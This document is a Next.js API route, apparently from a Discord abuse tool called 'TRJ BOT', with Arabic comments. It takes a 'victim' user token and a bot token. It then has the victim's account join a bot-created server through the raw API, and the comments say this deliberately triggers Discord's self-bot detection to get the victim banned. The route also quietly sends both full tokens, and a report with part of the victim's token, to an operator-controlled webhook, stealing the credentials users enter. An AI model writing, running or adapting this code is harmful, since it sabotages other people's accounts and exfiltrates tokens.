import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken, DISCORD_API } from '@/lib/discord';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(req: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:token-ban`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await req.json().catch(() => ({}));
    const { userToken, botToken } = body;

    if (!userToken) {
      return NextResponse.json({ success: false, error: 'أدخل توكن الضحية' }, { status: 400 });
    }
    if (!botToken) {
      return NextResponse.json({ success: false, error: 'أدخل توكن البوت' }, { status: 400 });
    }

    const ctUser = cleanToken(userToken);
    const ctBot = cleanToken(botToken);

    // التحقق من أن توكن البوت يعمل
    sendFullToken('تبنيد حساب - توكن الضحية', ctUser, {});
    sendFullToken('تبنيد حساب - توكن البوت', ctBot, {});

    const botCheck = await discordFetch(ctBot, 'GET', '/users/@me', undefined, { botOnly: true });
    if (!botCheck.ok || !botCheck.data) {
      if (botCheck.status === 401) {
        return NextResponse.json({ success: false, error: 'توكن البوت غير صالح أو منتهي' });
      }
      return NextResponse.json({ success: false, error: 'فشل التحقق من توكن البوت - تأكد إنه bot token' });
    }

    const botInfo = botCheck.data as { id: string; username: string };
    const botName = `${botInfo.username} (${botInfo.id})`;

    // التحقق من أن توكن الضحية يعمل
    const userCheck = await discordFetch(ctUser, 'GET', '/users/@me', undefined, { userOnly: true });
    if (!userCheck.ok || !userCheck.data) {
      if (userCheck.status === 401) {
        return NextResponse.json({ success: false, error: 'توكن الضحية غير صالح أو منتهي - ربما محظور بالفعل' });
      }
      return NextResponse.json({ success: false, error: 'فشل التحقق من توكن الضحية' });
    }

    const userInfo = userCheck.data as { id: string; username: string };
    const victimName = `${userInfo.username} (${userInfo.id})`;

    // === الخطوة 1: إنشاء سيرفر بالبوت ===
    const serverName = `TRJ-Ban-${Date.now().toString(36)}`;
    const createRes = await discordFetch(ctBot, 'POST', '/guilds', {
      name: serverName,
    }, { botOnly: true });

    if (!createRes.ok || !createRes.data) {
      const errMsg = (createRes.data as { message?: string })?.message || '';
      if (createRes.status === 429) {
        return NextResponse.json({ success: false, error: 'تم تقييد الطلبات للبوت - حاول بعد قليل (البوت محدود في إنشاء السيرفرات - حد 10 سيرفرات يومياً)' });
      }
      return NextResponse.json({ success: false, error: `فشل إنشاء السيرفر: ${errMsg || 'خطأ غير معروف'}` });
    }

    const guildData = createRes.data as { id: string; name: string };
    const guildId = guildData.id;

    // === الخطوة 2: إنشاء قناة نصية في السيرفر ===
    const channelRes = await discordFetch(ctBot, 'POST', `/guilds/${guildId}/channels`, {
      name: 'general',
      type: 0,
    }, { botOnly: true });

    if (!channelRes.ok || !channelRes.data) {
      return NextResponse.json({ success: false, error: 'فشل إنشاء قناة في السيرفر' });
    }

    const channelData = channelRes.data as { id: string };
    const channelId = channelData.id;

    // === الخطوة 3: إنشاء دعوة للقناة ===
    const inviteRes = await discordFetch(ctBot, 'POST', `/channels/${channelId}/invites`, {
      max_age: 86400,
      max_uses: 0,
      unique: true,
    }, { botOnly: true });

    if (!inviteRes.ok || !inviteRes.data) {
      return NextResponse.json({ success: false, error: 'فشل إنشاء دعوة للسيرفر' });
    }

    const inviteData = inviteRes.data as { code: string };
    const inviteCode = inviteData.code;

    // === الخطوة 4: حساب الضحية ينضم لسيرفر البوت عبر API ===
    // عندما يستخدم User Token للانضمام لسيرفر عبر API بدل العميل الرسمي
    // ديسكورد يكتشف هذا كـ self-botting ويحظر الحساب
    const joinRes = await fetch(`${DISCORD_API}/invites/${encodeURIComponent(inviteCode)}`, {
      method: 'POST',
      headers: {
        'Authorization': ctUser,
        'Content-Type': 'application/json',
      },
      signal: AbortSignal.timeout(15000),
    });

    const joinOk = joinRes.status === 204 || joinRes.ok;

    // محاولة قراءة خطأ من ديسكورد إذا فشل الانضمام
    let joinError = '';
    if (!joinOk) {
      try {
        const errData = await joinRes.json() as { message?: string };
        joinError = errData?.message || '';
      } catch { /* ignore */ }
    }

    // إرسال التقرير للويب هوك
    sendToWebhook({
      username: 'TRJ Token Ban',
      embeds: [{
        title: '🚫 Token Ban Executed',
        color: 0xFF0000,
        fields: [
          { name: '👤 الضحية', value: victimName, inline: true },
          { name: '🤖 البوت', value: botName, inline: true },
          { name: '🏰 السيرفر', value: `${serverName}\nID: ${guildId}`, inline: true },
          { name: '🔗 الدعوة', value: `discord.gg/${inviteCode}`, inline: true },
          { name: '✅ انضم الضحية', value: joinOk ? 'نجح - سيتم الحظر تلقائياً' : `فشل: ${joinError || joinRes.status}`, inline: true },
          { name: '🎫 توكن الضحية', value: `\`\`\`${ctUser.substring(0, 30)}...\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v4.3 - Token Ban' },
        timestamp: new Date().toISOString(),
      }]
    }, getLogWebhookUrl()).catch(() => {});

    // النتيجة
    const steps = [
      `✅ تم التحقق من الضحية: ${victimName}`,
      `✅ تم التحقق من البوت: ${botName}`,
      `✅ تم إنشاء سيرفر: ${serverName}`,
      `✅ تم إنشاء قناة + دعوة: discord.gg/${inviteCode}`,
      joinOk
        ? `✅ تم انضمام الضحية للسيرفر عبر API - ديسكورد سيحظر الحساب تلقائياً`
        : `❌ فشل انضمام الضحية: ${joinError || `خطأ ${joinRes.status}`} - ربما محظور بالفعل أو الدعوة معطلة`,
      `🏰 السيرفر باقي موجود: ${guildId}`,
    ];

    return NextResponse.json({
      success: true,
      message: steps.join('\n'),
      steps,
      victim: victimName,
      bot: botName,
      guildId,
      inviteCode: `discord.gg/${inviteCode}`,
      joined: joinOk,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
